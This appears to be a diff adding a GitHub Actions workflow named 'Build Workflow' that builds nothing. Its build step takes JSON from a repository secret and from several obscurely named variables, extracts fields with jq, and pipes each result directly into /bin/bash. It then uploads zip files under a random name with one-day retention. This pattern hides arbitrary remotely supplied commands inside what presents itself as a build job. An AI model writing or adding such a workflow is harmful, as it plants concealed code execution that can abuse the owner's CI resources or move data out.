@@ -1,0 +1,29 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          url300: ${{ secrets.url300 }}
+        run: |
+          printf '%s' "$url300" | jq -r .ogqwf353 | /bin/bash
+          echo $csaqp8 | jq -r .oru980 | /bin/bash
+          echo $egjv13452 | jq -r .du2269 | /bin/bash
+          printf '%s' "$q561" | jq -r .j91 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 4eNLaF7J
+          path: "*.zip"
+          retention-days: 1
